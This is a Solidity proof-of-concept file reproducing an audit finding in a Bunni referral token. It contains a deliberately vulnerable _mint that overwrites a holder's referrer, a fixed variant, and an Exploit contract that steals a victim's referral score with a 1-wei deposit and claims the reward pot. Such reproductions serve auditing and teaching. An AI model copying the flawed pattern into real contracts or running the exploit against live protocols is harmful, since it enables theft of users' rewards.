// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bunni — C-01 (Pashov, August 2024)
    ERC20Referrer._mint writes the caller-supplied referrer into the
    recipient's balance slot on every mint. Depositing 1 wei to a holder
    moves that holder's whole score onto the attacker's referrer. claim()
    then pays the stolen score out of the referral reward pot.
*/

contract Asset {
    string public symbol = "TOKEN";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BunniToken {
    uint256 internal constant BALANCE_SLOT = 1;
    mapping(uint24 => uint256) public scoreOf;
    mapping(uint24 => address) public payee;
    mapping(address => uint256) public balanceOf;

    function setPayee(uint24 referrer, address who) external {
        payee[referrer] = who;
    }

    function mint(address to, uint256 amount, uint24 referrer) external {
        _mint(to, amount, referrer);
    }

    function clearScore(uint24 referrer) external returns (uint256 score) {
        score = scoreOf[referrer];
        scoreOf[referrer] = 0;
    }

    /// _mint from ERC20Referrer. The balance word is referrer in the low 24 bits.
    function _mint(address to, uint256 amount, uint24 referrer) internal {
        uint256 slot = uint256(keccak256(abi.encode(to, BALANCE_SLOT)));
        uint256 word;
        assembly {
            word := sload(slot)
        }
        uint256 toLocked = word & (uint256(1) << 255);
        uint24 oldReferrer = uint24(word);
        uint256 oldBalance = (word >> 24) & ((uint256(1) << 231) - 1);
        uint256 updatedBalance = oldBalance + amount;
        uint256 updatedToBalance = updatedBalance << 24;
        if (oldReferrer != referrer) {
            if (oldBalance > 0) {
                scoreOf[oldReferrer] -= oldBalance;
            }
            scoreOf[referrer] += updatedBalance;
        } else {
            scoreOf[referrer] += amount;
        }
        // @> VULN: the mint stores the caller-chosen referrer over the holder's existing referrer
        assembly {
            sstore(slot, or(toLocked, or(referrer, updatedToBalance)))
        }
        balanceOf[to] = updatedBalance;
    }
}

contract BunniTokenFixed {
    mapping(uint24 => uint256) public scoreOf;
    mapping(uint24 => address) public payee;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint24) public referrerOf;

    function setPayee(uint24 referrer, address who) external {
        payee[referrer] = who;
    }

    function mint(address to, uint256 amount, uint24 referrer) external {
        uint24 current = referrerOf[to];
        if (current != 0) referrer = current;
        uint256 updated = balanceOf[to] + amount;
        if (current == 0) referrerOf[to] = referrer;
        scoreOf[referrer] += amount;
        balanceOf[to] = updated;
    }

    function clearScore(uint24 referrer) external returns (uint256 score) {
        score = scoreOf[referrer];
        scoreOf[referrer] = 0;
    }
}

contract Hub {
    Asset public asset;
    BunniToken public token;
    Asset public reward;

    constructor(Asset _asset, BunniToken _token, Asset _reward) {
        asset = _asset;
        token = _token;
        reward = _reward;
    }

    function deposit(address recipient, uint256 amount, uint24 referrer) external {
        asset.transferFrom(msg.sender, address(this), amount);
        token.mint(recipient, amount, referrer);
    }

    function claim(uint24 referrer) external returns (uint256 paid) {
        require(token.payee(referrer) == msg.sender, "payee");
        paid = token.clearScore(referrer);
        reward.transfer(msg.sender, paid);
    }
}

contract Exploit {
    uint24 public constant REF_A = 0xA;
    uint24 public constant REF_B = 0xB;
    address public victim = address(0xA11CE);

    Asset public asset;
    Asset public reward;
    BunniToken public token;
    Hub public hub;
    uint256 public scoreABefore;
    uint256 public scoreBAfter;
    uint256 public scoreAAfter;
    uint256 public paid;

    constructor() {
        asset = new Asset();
        reward = new Asset();
        token = new BunniToken();
        hub = new Hub(asset, token, reward);
        token.setPayee(REF_A, victim);
        token.setPayee(REF_B, address(this));
        token.mint(victim, 100 ether, REF_A);
        asset.mint(address(this), 1);
        reward.mint(address(hub), 100 ether + 1);
    }

    function run() external {
        scoreABefore = token.scoreOf(REF_A);
        asset.approve(address(hub), 1);
        hub.deposit(victim, 1, REF_B);
        scoreAAfter = token.scoreOf(REF_A);
        scoreBAfter = token.scoreOf(REF_B);
        paid = hub.claim(REF_B);
        require(scoreABefore == 100 ether, "before");
        require(scoreAAfter == 0, "stolen");
        require(scoreBAfter == 100 ether + 1, "moved");
        require(paid == 100 ether + 1, "paid");
        require(reward.balanceOf(address(this)) == 100 ether + 1, "balance");
    }
}
